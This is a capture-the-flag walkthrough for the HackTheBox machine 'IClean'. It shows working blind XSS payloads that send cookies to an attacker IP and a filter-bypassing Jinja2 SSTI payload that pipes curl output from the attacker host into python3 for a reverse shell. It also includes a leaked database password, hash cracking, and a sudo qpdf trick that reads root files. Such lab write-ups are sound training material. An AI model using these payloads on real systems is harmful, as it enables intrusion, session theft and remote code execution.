---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# IClean

```
└─$ nmap -sV -sC 10.10.11.12

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 13:56 CEST

Nmap scan report for 10.10.11.12

Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
```

## Port (80)

First, I add  `10.10.11.12 capiclean.htb` to `/etc/hosts`

### Enumeration

#### Subdomains

None discovered using `ffuf`

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.capiclean.htb" -u http://capiclean.htb -fs 274
```

#### Feroxbuster

```
└─$ feroxbuster -u http://capiclean.htb/ --insecure  

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___

by Ben "epi" Risher                    ver: 2.10.1
───────────────────────────┬──────────────────────
     Target Url            │ http://capiclean.htb/
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.10.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Insecure              │ true
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
   Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

200      GET       88l      159w     2106c http://capiclean.htb/login

302      GET        5l       22w      189c http://capiclean.htb/logout => http://capiclean.htb/
200      GET      130l      355w     5267c http://capiclean.htb/about

200      GET       90l      181w     2237c http://capiclean.htb/quote

200      GET      154l      399w     6084c http://capiclean.htb/choose

200      GET      183l      564w     8109c http://capiclean.htb/team

200      GET        8l       53w     2064c http://capiclean.htb/static/images/icon-2.png

200      GET        1l      870w    42839c http://capiclean.htb/static/css/jquery.mCustomScrollbar.min.css

200      GET       15l      110w     7039c http://capiclean.htb/static/images/logo.png

200      GET      369l     1201w     9644c http://capiclean.htb/static/js/custom.js

200      GET        5l       57w     2262c http://capiclean.htb/static/images/instagram-icon.png

200      GET        6l      352w    19190c http://capiclean.htb/static/js/popper.min.js

200      GET        4l       53w     1995c http://capiclean.htb/static/images/fb-icon.png

200      GET        5l       46w     1384c http://capiclean.htb/static/images/search-icon.png

200      GET        6l       44w     1013c http://capiclean.htb/static/css/owl.theme.default.min.css

200      GET        3l       50w     1779c http://capiclean.htb/static/images/map-icon.png

200      GET      872l     1593w    16549c http://capiclean.htb/static/css/style.css

200      GET        3l       39w     1008c http://capiclean.htb/static/images/toggle-icon.png

200      GET        5l       52w     2215c http://capiclean.htb/static/images/linkden-icon.png

200      GET        8l       63w     2400c http://capiclean.htb/static/images/call-icon.png

200      GET      193l      579w     8592c http://capiclean.htb/services

200      GET        3l       17w     1061c http://capiclean.htb/static/images/favicon.png

200      GET        5l      478w    45479c http://capiclean.htb/static/js/jquery.mCustomScrollbar.concat.min.js

200      GET      162l      931w    80352c http://capiclean.htb/static/images/img-4.png

200      GET        4l       53w     2119c http://capiclean.htb/static/images/twitter-icon.png

200      GET     3448l    10094w    89992c http://capiclean.htb/static/js/owl.carousel.js

200      GET        3l       56w     2181c http://capiclean.htb/static/images/icon-1.png

200      GET        6l       73w     3248c http://capiclean.htb/static/css/owl.carousel.min.css

200      GET        7l      896w    70808c http://capiclean.htb/static/js/bootstrap.bundle.min.js

200      GET      213l     1380w    11324c http://capiclean.htb/static/js/jquery-3.0.0.min.js

200      GET      605l     3945w   299706c http://capiclean.htb/static/images/img-3.png

200      GET      446l     1347w    11748c http://capiclean.htb/static/css/responsive.css

200      GET        1l      153w    22994c http://capiclean.htb/static/js/jquery.fancybox.min.js

200      GET      623l     3867w   281026c http://capiclean.htb/static/images/img-1.png

200      GET      167l      997w    83329c http://capiclean.htb/static/images/img-7.png

200      GET      180l     1125w    84070c http://capiclean.htb/static/images/img-6.png

200      GET        5l     1287w    87088c http://capiclean.htb/static/js/jquery.min.js

200      GET      332l     1920w   144448c http://capiclean.htb/static/images/img-2.png

200      GET        7l     1604w   140421c http://capiclean.htb/static/css/bootstrap.min.css

200      GET    18950l    75725w   918708c http://capiclean.htb/static/js/plugin.js

200      GET      349l     1208w    16697c http://capiclean.htb/
302      GET        5l       22w      189c http://capiclean.htb/dashboard => http://capiclean.htb/
405      GET        5l       20w      153c http://capiclean.htb/sendMessage

403      GET        9l       28w      278c http://capiclean.htb/server-status
[####################] - 2m     30049/30049   0s      found:44      errors:118    
[####################] - 2m     30000/30000   321/s   http://capiclean.htb/
```

That gave us some really nice and interesting hits. <http://capiclean.htb/login>

<http://capiclean.htb/quote>

<http://capiclean.htb/sendMessage>: 405 Method not allowed

<http://capiclean.htb/dashboard>: redirects back (probably because no login session)

#### Wappalyzer

I do not see obvious hints on the technology. So, let's look on Wappalyzer. It is a Chrome extension. So, it is Python

### Site Interaction

Now that is the time to familiarise yourself with the site. After trying it out, there are some interesting stuff.

1. login form on `/login`
2. email + checkboxes on `/quote`
   * produces a POST request to `/sendMessage` with:

```
service=Carpet+Cleaning&service=Tile+%26+Grout&service=Office+Cleaning&email=test%40test.test
```

as a body

#### Engagement Ideas

* login bruteforce: only as a last resort
* SQL injection: that might be it, especially on login form
* command injection: sure, but we do not have much to catch on
* blind XSS: input is not rendered so simmilar to CI, but more realistic in this setting.
* Apache reverse proxy CVEs: seems unlikely

### SQL Injection (Failed)

Let's check it with SQLmap

First the login form

```
sqlmap -u "http://capiclean.htb/login" --data "username=*&password=*"
```

Then the email sending

```
sqlmap -u "http://capiclean.htb/sendMessage" --data "service=*&email=*"
```

Both failed to find something interesting. Even with `--level=2 --risk=2` it did not worked. So it seems unlikely and I will not try it anymore (if not desperate).

### Blind XSS

Since, the user input is not rendered, I do not see if it succeeded. But there might be someone that would open it and allow me to snatch a cookie or two. For that I will be using `btoa` function that lets me to awoid problems with formating, encoding, etc. It transform the input to base64. <https://developer.mozilla.org/en-US/docs/Web/API/btoa>

Let's try some payloads: <https://github.com/payloadbox/xss-payload-list>

There are few to try. So, first set up a listener

```
python3 -m http.server 80
```

and then the payload. I will try to inject the service parameter. Now select the payload, add the ping to the listener `http://10.10.14.50:80/"+btoa(document.cookie` (change IP) and send them as a POST to `/sendMessage`. One of these two payloads was it.

```
service=<img/src/onerror="http://10.10.14.50:80/"+btoa(document.cookie)>&email=whatever@example.com
```

```
service=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.14.50%3a80/"%2bbtoa(document.cookie)>&email=whatever@example.com
```

Why? Well it took some time to get the hit. Actually it was quite a long time! Thinking about HTB meta, there probably is a CRONjob checking the requests in bulk.

After some time I receive a hit.

```
c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoazAwUS42YnplUWxmN3pLZWM2SVMxNVNNOE5EWDB2TW8=
```

which is Base64 for

```
session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zhkp9A.na2BC1F7vrWFTCquQtNfgBW899w
```

Based on the format, it is some pseudo-JWT

it contains MD5 hashed 'admin'. Let's use it as cookie. Be careful, you need to do this every time the machine restarts, as the cookie is generated anew.

With that, I can access dashboard. Finally!

### Dashboard

There is tons of now things to do. The most interesting are:

* Reading requests (the mails): ok, that's how you get the XSS through
* Generating invoice: maybe another injection?
* Generating QR of an invoice: injection?
* Displaying QR in a PDF: based on an image URL: that might be interesting.

#### QR in a PDF

Let's fiddle with the request and observe what is happening on the response. So first add some gibberish there.

```
invoice_id=&form_type=scannable_invoice&qr_link=foobar
```

returns

```
<div class="qr-code"><img src="data:image/png;base64,foobar" alt="QR Code"></div>
```

That is interesting. Lets try to render it on site

```
invoice_id=&form_type=scannable_invoice&qr_link="alt%3d"QR+Code">{{1%2b1}}
<img+src%3d"
```

gives

```
<div class="qr-code"><img src="data:image/png;base64,"alt="QR Code">foobar
</div>
```

Nice, now what to do with it...

### SSTI (Server-Side Template Injection)

Now, I know it is Flask/Python. That tipically uses templates (e.g., Jinja2) to render stuff. It would also make sense here, based on the behaviour. So, let's try some templaing action.

```
invoice_id=&form_type=scannable_invoice&qr_link="alt%3d"QR+Code">{{1%2b1}}
<img+src%3d"
```

returns

```
<img src="data:image/png;base64,"alt="QR Code">2

```

Nice! it works.

Now, reading time: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

What I want to do, is use Python to execute commands (like reverse shell) on host. According to the reading material, there is a nice quick path (there are many) using Python's magic methods. So I want to get here:

```
{{ lipsum.__globals__["os"].popen('id').read() }}
```

But I get 500. Hmm... why? Let's drill down and try it step by step. Probably there is some filtering, so I need to craft it in a way that would avoid it. I will utilise the ideas from the reading material.

#### Payload Crafting

```
lipsum.__globals__
```

No, but I can rewrite the call

```
lipsum["__globals__"]
```

Also nothing. So let's try to split the string argument to pieces

```
lipsum|attr(["_"*2,"globals","_"*2]|join)
```

That works! So, let's move forward

```
(lipsum|attr(["_"*2,"globals","_"*2]|join))["os"]
```

Is also OK

```
(lipsum|attr(["_"*2,"globals","_"*2]|join))["os"].popen('id')
```

Works. Now for the last piece

```
(lipsum|attr(["_"*2,"globals","_"*2]|join))["os"].popen('id').read()
```

And there it is! Now I can use something more usefull in place of that `id`.

##### Alternative

Andrej used a different path. Based on this writeup <https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/>

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
```

### Reverse Shell

For the reverse shell, I will use the good 'ol TTY Python shell. First, host the backconnect script and fire-up the listener

```
python2 tcp_pty_shell_handler.py -b 0.0.0.0:443
```

Now send the crafted payload in POST request

```
invoice_id=&form_type=scannable_invoice&qr_link="alt%3d"QR+Code">{{(lipsum|attr(["_"*2,"globals","_"*2]|join))["os"].popen('curl+http%3a//10.10.14.50%3a80/tcp_pty_backconnect.py|python3').read()}}
<img+src%3d"
```

And bang! That's `www-data` shell right there. Wait, what?

## Escalate to User

Ok, I am not the user. Who is the user? By looking on `/home` directory, I find `consuela`. That will be my target.

Now, I see `app.py` file. Let's take a look if there is something worthwhile. Like DB credentials, right?

```
# Database Configuration

db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

Cool, so, let's look inside

```
mysql -h localhost -P 3306 -u iclean -p capiclean
```

There is `users` table, and among the rows is `consuela` :)

```
mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
```

Based on the length, it could be SHA256. And that calls for some Hashcat action.

```
hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt
```

The `-m 1400` reffers to SHA256. Very quickly, I receive the cracked hash.

```
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

Simple and clean

Let's hop in

```
sshpass -p'simple and clean' ssh -o StrictHostKeyChecking=no consuela@10.10.11.12
```

And grab the first flag.

## Escalate to Root

First things first. What can I `sudo`?

```
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

A binary to process PDF files.

Googling around did not find any vulnerability.

Let's look at `--help` or docs <https://qpdf.readthedocs.io/en/stable/cli.html>

Interestingly, I can add attachments to the PDF. <https://qpdf.readthedocs.io/en/stable/cli.html#embedded-files-attachments>

Let's try it out:

```
sudo /usr/bin/qpdf --add-attachment /root/root.txt --mimetype=text/plain -- --empty -
```

The `--add-attachment /root/root.txt --mimetype=text/plain --` is a command to add the attachment (flag) to the PDF (mimetype could be skipped...probably). Arguments for this "subcommand" are ended by `--`. Now, the `--empty` takes an empty PDF and `-` writes the output to stdout.

And it works....kinda. The file is encoded in binary :/ I could to save it, exfiltrate it, and read it, but I want to avoid disc writes. Is there another way?

Yes, there is: thanks George: a QTF format for text editors! <https://qpdf.readthedocs.io/en/stable/cli.html#option-qdf>

```
sudo /usr/bin/qpdf -qdf --add-attachment /root/root.txt --mimetype=text/plain -- --empty -
```

Serves the flag.

### Additional hints

There is also a hint to the `qpdf` binary, and somewhat a "story" why it is there and why it is so misconfigured in the first place. Of course it is a mail .

```
consuela@iclean:/tmp$ cat /var/mail/consuela 
To: <consuela@capiclean.htb>
Subject: Issues with PDFs

From: management <management@capiclean.htb>
Date: Wed September 6 09:15:33 2023

Hey Consuela,

Have a look over the invoices, I've been receiving some weird PDFs lately.

Regards,
Management
```